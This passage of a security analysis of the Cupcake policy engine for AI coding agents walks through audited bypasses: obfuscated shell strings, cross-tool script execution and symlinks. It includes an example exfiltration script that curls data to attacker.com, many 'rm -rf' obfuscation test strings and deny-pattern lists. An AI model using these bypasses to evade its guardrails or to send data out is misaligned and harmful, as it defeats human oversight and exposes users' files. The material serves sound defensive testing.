- Static analysis (parsing and analyzing code) - complex, language-specific
- Sandboxed execution preview (run in sandbox to see effects) - slow, complex

**None of these are implemented** in Cupcake.

## Impact Assessment

### Risk Severity Matrix

| Vulnerability | Severity | Difficulty | Exploitability | Impact | Overall Risk |
|--------------|----------|------------|----------------|---------|--------------|
| #3: String Matching | High | Low | Very Easy | Critical | **CRITICAL** |
| #2: Cross-Tool | High | Low | Easy | Critical | **CRITICAL** |
| #4: Symlink | High | Low | Easy | High | **HIGH** |

### Real-World Impact Scenarios

#### Scenario 1: Malicious AI Agent

**Context**: Adversarial agent attempting to exfiltrate data

**Attack Sequence**:
1. Agent recognizes Cupcake is active (policy blocks revealed in error messages)
2. Agent uses Write tool to create script: `backup.sh`
3. Script contents (with obfuscated commands):
   ```bash
   #!/bin/bash
   ln  -s  .cupcake  temp_backup
   tar    czf    /tmp/data.tar.gz  temp_backup/
   curl    -X    POST  https://attacker.com/exfil  --data-binary  @/tmp/data.tar.gz
   ```
4. Agent executes: `bash backup.sh`

**Policy Evaluation**:
- Write event: Creating `backup.sh` → No Bash policy checks content → **Allowed**
- Bash event: `bash backup.sh` → Doesn't contain `.cupcake`, `rm`, `curl` as substring → **Allowed**

**Result**:
- Symlink created to `.cupcake/`
- All Cupcake configuration and policies exfiltrated
- Extra spaces bypass string matching
- **Complete security breach** despite policies supposedly protecting `.cupcake/`

#### Scenario 2: Benign Agent Accidental Bypass

**Context**: Helpful agent using command substitution for legitimate reasons

**Agent Behavior**:
```bash
# Agent wants to clean old temporary files
# Uses command substitution to get current user
$(whoami) at runtime: "ramos"
rm -rf /tmp/$(whoami)_cache
# Expands to: rm -rf /tmp/ramos_cache
```

**Policy Configuration**: Block `rm -rf` commands

**Policy Evaluation**:
- Command string: `"rm -rf /tmp/$(whoami)_cache"`
- Pattern match: `contains("rm -rf /tmp/$(whoami)_cache", "rm -rf")` → **TRUE**
- **Decision: Deny** ✓

**But with slight variation**:
```bash
# Agent formats command differently
rm -rf "/tmp/$(whoami)_cache"  # Quotes around path
# OR
rm  -rf  /tmp/$(whoami)_cache  # Extra spaces (formatter added)
```

**Policy Evaluation**:
- Pattern match with quotes: `contains('rm -rf "/tmp/...', "rm -rf")` → **FALSE** (quote breaks pattern)
- Pattern match with spaces: `contains("rm  -rf", "rm -rf")` → **FALSE**
- **Decision: Allow** ✗

**Result**: Agent accidentally bypasses policy through normal command formatting, potentially deleting important files.

**Impact**: Even non-adversarial agents can bypass policies through normal variations in command syntax.

#### Scenario 3: Enterprise Compliance Failure

**Context**: Organization using Cupcake for SOC 2 compliance

**Compliance Requirement**: "All production file modifications must be logged and reviewed"

**Implementation**:
```rego
# Policy: Block all Edit operations on production.env
deny contains decision if {
    input.tool_name == "Edit"
    input.tool_input.file_path == "production.env"
    decision := {
        "rule_id": "COMPLIANCE-001",
        "reason": "Production files require change review",
        "severity": "HIGH"
    }
}
```

**Audit Test** (during compliance review):
```json
// Auditor test: Try to edit production.env
{
  "tool_name": "Edit",
  "file_path": "production.env"
}
// Result: Blocked ✓
// Auditor conclusion: Compliance requirement met ✓
```

**Actual Usage** (in production):
```bash
# Developer uses agent to update production config
# Agent uses Bash instead of Edit tool:
echo "NEW_API_KEY=secret123" >> production.env
```

**Policy Evaluation**:
- Routes to: `PreToolUse:Bash` (not Edit!)
- No Bash policy exists to protect `production.env`
- **Decision: Allow** ✗

**Result**:
- Production file modified **without review**
- Modification **not logged** (policy didn't fire)
- SOC 2 compliance requirement **violated**
- Organization **fails audit** despite "passing" compliance tests

**Impact**: False sense of compliance - policies appear to work in testing but fail in production scenarios.

### Exploitation Likelihood

**Factors Increasing Likelihood**:

1. **Public Knowledge**: Trail of Bits audit is public → vulnerabilities are documented
2. **Low Difficulty**: All marked "Low" by ToB → easy to exploit
3. **AI Agent Context**: Agents can recognize policy patterns from error messages
4. **Natural Language**: Users might inadvertently ask agents to bypass (e.g., "use a different approach")

**Attack Vectors in Practice**:

**Adversarial User**:
```
User: "I need to remove the .cupcake directory but the policy is blocking me.
       Can you find another way?"

Agent: "I'll create a script to work around the restriction..."
```

**Benign User** (unintentional):
```
User: "The rm command isn't working, can you try a different approach?"

Agent: "Let me use alternative syntax..."
       [Applies command substitution that bypasses policy]
```

**Automated Tools**:
- Fuzzing tools could discover bypass patterns
- AI agent red-team tools could test policy robustness
- Penetration testing frameworks could include Cupcake bypass modules

---

## Test Coverage Gaps

### Current Test Philosophy

Tests validate **intended functionality** where policies work as designed:

**Example**: `cupcake-core/tests/rulebook_security_integration.rs`
```rust
// Test blocks direct .cupcake reference ✓
let edit_event = json!({
    "tool_name": "Edit",
    "file_path": ".cupcake/policies/example.rego"
});
assert!(matches!(decision, FinalDecision::Halt { .. }));

// Test allows normal files ✓
let normal_edit = json!({
    "tool_name": "Edit",
    "file_path": "src/main.rs"
});
assert!(matches!(decision, FinalDecision::Allow { .. }));
```

**What's Missing**: **Adversarial testing** - actively trying to break policies.

### Missing Test Categories

#### 1. String Obfuscation Tests

```rust
#[tokio::test]
async fn test_extra_spaces_bypass() {
    // Original: rm -rf /protected
    test_bash_command("rm  -rf  /protected");      // Extra spaces
    test_bash_command("rm    -rf    /protected");  // Multiple spaces
    test_bash_command("rm -rf  /protected");       // Space after flags
    test_bash_command("rm  -rf/protected");        // No space before path
}

#[tokio::test]
async fn test_command_substitution_bypass() {
    test_bash_command("$(echo rm) -rf /protected");
    test_bash_command("`echo rm` -rf /protected");
    test_bash_command("$(printf 'rm') -rf /protected");
}

#[tokio::test]
async fn test_function_bypass() {
    test_bash_command("f() { rm \"$@\"; }; f -rf /protected");
    test_bash_command("function f { rm \"$@\"; }; f -rf /protected");
}

#[tokio::test]
async fn test_quoting_bypass() {
    test_bash_command("'rm' -rf /protected");
    test_bash_command("\"rm\" -rf /protected");
    test_bash_command("r''m -rf /protected");  // Empty string concatenation
}
```

#### 2. Cross-Tool Equivalence Tests

```rust
#[tokio::test]
async fn test_cross_tool_file_deletion() {
    // Policy should block file deletion regardless of tool

    // Direct Bash rm
    assert_blocked("Bash", json!({"command": "rm protected.txt"}));

    // Bash with output redirection to /dev/null (effectively deletes content)
    assert_blocked("Bash", json!({"command": "cat /dev/null > protected.txt"}));

    // Write tool with empty content (effectively deletes content)
    assert_blocked("Write", json!({
        "file_path": "protected.txt",
        "content": ""
    }));

    // Edit tool removing all content
    assert_blocked("Edit", json!({
        "file_path": "protected.txt",
        "old_string": "<entire file>",
        "new_string": ""
    }));
}

#[tokio::test]
async fn test_cross_tool_script_execution() {
    let engine = setup_engine();

    // Step 1: Create malicious script via Write
    let write_event = json!({
        "tool_name": "Write",
        "file_path": "evil.sh",
        "content": "rm -rf /protected"
    });
    // Should this be blocked? (Currently allowed)

    // Step 2: Execute via Bash
    let bash_event = json!({
        "tool_name": "Bash",
        "command": "bash evil.sh"
    });
    // Should recognize evil.sh contains dangerous command

    // Result: protected directory should NOT be deletable
}
```

#### 3. Symlink Attack Tests

```rust
#[tokio::test]
async fn test_symlink_creation_to_protected_path() {
    // Create symlink to .cupcake
    let symlink_event = json!({
        "tool_name": "Bash",
        "command": "ln -s .cupcake foo"
    });
    // Should this be blocked?
    assert_blocked_or_warned(symlink_event);
}

#[tokio::test]
async fn test_write_through_symlink() {
    // Assume symlink foo -> .cupcake already exists

    let write_event = json!({
        "tool_name": "Write",
        "file_path": "foo/malicious.rego",
        "content": "package malicious\nallow := true"
    });

    // Policy should recognize foo resolves to .cupcake
    // Currently: Does not (path is just string "foo/malicious.rego")
    assert_blocked(write_event);
}

#[tokio::test]
async fn test_hard_link_to_protected_file() {
    let hardlink_event = json!({
        "tool_name": "Bash",
        "command": "ln .cupcake/rulebook.yml exposed.yml"
    });
    // Creates hard link - both paths point to same inode
    // Reading exposed.yml reveals .cupcake/rulebook.yml
    assert_blocked_or_warned(hardlink_event);
}
```

#### 4. Multi-Step Attack Sequence Tests

```rust
#[tokio::test]
async fn test_multi_step_bypass_sequence() {
    let engine = setup_engine();

    // Step 1: Create script
    let step1 = json!({
        "tool_name": "Write",
        "file_path": "setup.sh",
        "content": "ln -s .cupcake alias"
    });
    engine.evaluate(&step1).await?;

    // Step 2: Execute script
    let step2 = json!({
        "tool_name": "Bash",
        "command": "bash setup.sh"
    });
    engine.evaluate(&step2).await?;

    // Step 3: Write through symlink
    let step3 = json!({
        "tool_name": "Write",
        "file_path": "alias/backdoor.sh",
        "content": "malicious code"
    });
    let decision = engine.evaluate(&step3).await?;

    // At some point in this sequence, should be blocked
    assert!(
        matches!(decision, FinalDecision::Halt { .. }),
        "Multi-step attack bypassed all policies"
    );
}
```

#### 5. Fuzz Testing

```rust
#[tokio::test]
async fn fuzz_test_bash_command_variations() {
    let base_command = "rm -rf /protected";

    // Generate variations
    let variations = vec![
        "rm  -rf /protected",              // Extra space
        "rm   -rf /protected",             // More spaces
        "rm\t-rf /protected",              // Tab instead of space
        "rm -rf  /protected",              // Space before path
        "rm -rf\t/protected",              // Tab before path
        "rm-rf /protected",                // No space after rm
        "rm -rf/protected",                // No space before path
        " rm -rf /protected",              // Leading space
        "rm -rf /protected ",              // Trailing space
        "(rm) -rf /protected",             // Subshell

### Why These Tests Don't Exist

**Reasons**:

1. **Test Philosophy**: Current tests validate "happy path" functionality, not adversarial scenarios
2. **Incomplete Threat Model**: Tests weren't written with adversarial agents in mind
3. **Missing Expertise**: Writing adversarial tests requires security mindset, not just functional testing
4. **Time Constraints**: Comprehensive adversarial testing is time-consuming
5. **False Confidence**: Policies work in normal cases, creating false sense of security

**Quote from ToB Report**:
> **Difficulty: Low**

This indicates the bypasses are so straightforward that **basic adversarial testing** would have caught them. The lack of such testing is a significant gap.

## Current Mitigation Status

### Partial Defenses Already Implemented

#### 1. Multiple Pattern Matching (Incomplete Defense)

**Location**: `fixtures/claude/builtins/rulebook_security_guardrails.rego:98-178`

**What It Does**:
```rego
contains_cupcake_modification_pattern(cmd) if {
    contains(cmd, ".cupcake")

    dangerous_patterns := {
        "rm ",           # Remove files
        "rmdir ",        # Remove directories
        "mv ",           # Move (could overwrite)
        "cp ",           # Copy (could overwrite)
        " > ",           # Redirect output
        " >> ",          # Append output
        "tee ",          # Write to file
        "sed -i",        # In-place edit
        ...
    }

    some pattern in dangerous_patterns
    contains(cmd, pattern)
}
```

**Strengths**:
- Covers multiple dangerous operations
- Checks for output redirection
- Includes in-place editors

**Weaknesses**:
- Still uses `contains()` → vulnerable to spacing variations
- Pattern list is incomplete (e.g., missing `ln -s`)
- Cannot handle command substitution
- Cannot detect obfuscated patterns

**Example Bypass**:
```bash
# Caught:
rm .cupcake/file.txt

# Bypassed:
rm  .cupcake/file.txt              # Extra space in "rm "
r''m .cupcake/file.txt             # Quote concatenation
$(echo rm) .cupcake/file.txt       # Command substitution
```

#### 2. Command Expansion Detection (Incomplete Defense)

**Location**: `fixtures/claude/builtins/rulebook_security_guardrails.rego:162-178`

**What It Does**:
```rego
contains_cupcake_modification_pattern(cmd) if {
    contains(cmd, ".cupcake")

    expansion_patterns := {
        "$(echo",        # Command substitution
        "`echo",         # Backtick expansion
        "${",            # Variable expansion
        "$(",            # Command substitution
        "eval ",         # Dynamic evaluation
    }

    some pattern in expansion_patterns
    contains(cmd, pattern)
}
```

**Strengths**:
- Recognizes command substitution as dangerous
- Blocks `eval` (dynamic code execution)
- Covers both `$()` and backtick syntax

**Weaknesses**:
- Only blocks if BOTH `.cupcake` AND expansion pattern exist
- Doesn't parse what the substitution produces
- Can be bypassed with indirect methods

**Example Bypass**:
```bash
# Caught:
$(echo rm) .cupcake/file.txt

# Bypassed:
$(echo rm) temp/file.txt
# Where temp is a symlink to .cupcake
# (No .cupcake in command string)

# Also bypassed:
eval "rm .cupcake/file.txt"
# (Pattern is "eval ", but command has no space: "eval(rm ...)")
```

#### 3. Whitelist Approach for Protected Paths (Incomplete Defense)

**Location**: `fixtures/claude/builtins/protected_paths.rego:119-186`

**What It Does**:
```rego
is_whitelisted_read_command(cmd) if {
    safe_read_commands := {
        "cat ",
        "less ",
        "grep ",
        "ls ",
        ...
    }

    some pattern in safe_read_commands
    startswith(cmd, pattern)

    # Explicit rejection of dangerous variants
    not startswith(cmd, "sed -i")
}
```

**Strengths**:
- Allowlist approach is more secure than denylist
- Explicitly rejects `sed -i` even though `sed` is whitelisted
- Only allows known-safe commands

**Weaknesses**:
- Incomplete allowlist (may block legitimate operations)
- Still uses string matching → vulnerable to variations
- Cannot verify command actually does what it claims

**Example Bypass**:
```bash
# Allowed (legitimate read):
cat /protected/file.txt

# Blocked correctly:
sed -i 's/old/new/' /protected/file.txt

# Bypassed:
sed 's/old/new/' /protected/file.txt > /protected/file.txt
# (sed without -i is allowed, but redirecting output modifies file)

# Also bypassed:
awk '{gsub(/old/, "new"); print}' /protected/file.txt > /protected/file.txt
# (awk is whitelisted for reads, but > writes back)
```

#### 4. Path Normalization (Incomplete Defense)

**Location**: `fixtures/claude/builtins/rulebook_security_guardrails.rego:82-87`

**What It Does**:
```rego
targets_cupcake_directory(file_path) if {
    lower_path := lower(file_path)
    normalized := regex.replace(lower_path, `/{2,}`, "/")         # Remove multiple slashes
    normalized_clean := regex.replace(normalized, `/\./`, "/")   # Remove /./ segments
    contains(normalized_clean, ".cupcake")
}
```

**Strengths**:
- Handles `//` → `/` normalization
- Removes `./` path segments
- Case-insensitive matching

**Weaknesses**:
- **Cannot resolve symlinks** (WASM limitation)
- **Cannot resolve `..`** (parent directory) reliably without filesystem access
- **Cannot detect hard links**
- Still string-based, not filesystem-based

**Example Bypass**:
```bash
# Caught:
.cupcake/file.txt
.//cupcake/file.txt
././.cupcake/file.txt

# Bypassed:
foo/file.txt                    # Where foo -> .cupcake symlink
../project/.cupcake/file.txt    # From subdirectory (.. not resolved)
```

### What's NOT Mitigated

**Critical Gaps**:

1. **No shell syntax parser** → Cannot understand shell semantics
   - Missing: AST-based command analysis
   - Missing: Semantic equivalence detection

2. **No symlink resolution** → Cannot detect filesystem aliasing
   - Missing: Path canonicalization
   - Missing: Inode-based protection

3. **No cross-tool correlation** → Cannot track multi-step attacks
   - Missing: Session state tracking
   - Missing: Operation sequence analysis
   - Missing: Cumulative effect detection

4. **No content inspection** → Cannot see what scripts contain
   - Missing: Script analysis before execution
   - Missing: Dynamic code detection
   - Missing: Payload inspection

5. **No behavioral analysis** → Cannot understand operation intent
   - Missing: Semantic understanding of "delete file"
   - Missing: Intent recognition across syntax variations
   - Missing: Threat modeling of operation effects

### Trail of Bits Recommendations

From the vulnerability report:

**For Issue #3 (String Matching)**:
> **Short term**, incorporate regex and special character checks to the analysis.

**Analysis**: This is a **band-aid**, not a solution. Regex can catch more patterns but still can't understand shell semantics. Would require maintaining increasingly complex regex patterns for every possible obfuscation technique.

**For Issue #2 (Cross-Tool)**:
> **Short term**, provide guidance to the user on policy best practices. For example, best practice may dictate an allow list as the recommended means to enable the agent without requiring complex multi tool disallow policies.

**Analysis**: This is **admission of architectural limitation**. ToB recognizes the cross-tool issue can't be fixed short-term, so recommends:
- User education (shift responsibility to users)
- Allowlist approach (flip the model from "block dangerous" to "allow safe")
- Accept complexity (users must write N×M policies)

**For Issue #4 (Symlink)**:
> **Short term**, require strict Unix permissions on the `.cupcake` directory to prevent modification.

**Analysis**: This is **recommending OS-level security** instead of application-level. ToB recognizes Cupcake policies **cannot reliably protect paths**, so recommends falling back to filesystem permissions (chmod 500 .cupcake).

**Implication**: All three recommendations acknowledge these are **fundamental limitations** that can't be easily fixed within Cupcake's current architecture.

---

## Conclusion

These three vulnerabilities represent **fundamental architectural challenges** in building a policy engine for AI agents:

1. **String matching cannot understand shell semantics** (Issue #3)
2. **Tool-isolated routing cannot prevent cross-tool attacks** (Issue #2)
3. **WASM sandbox cannot resolve filesystem aliases** (Issue #4)

The issues are **interconnected** and can be **chained together** for sophisticated bypasses that completely circumvent all protections.

**Current test coverage** validates intended functionality but **misses adversarial scenarios**, creating a **false sense of security**.

**Existing mitigations** provide partial defense but have **significant gaps** that determined attackers (or even benign agents using natural command variations) can exploit.

**Addressing these issues requires architectural changes** beyond simple code fixes - potentially including:
- Shell parser integration
- Cross-tool operation correlation
- Session state tracking
- Filesystem introspection capabilities
- Semantic operation understanding

**This analysis provides the foundation** for designing comprehensive remediations that address root causes rather than symptoms.
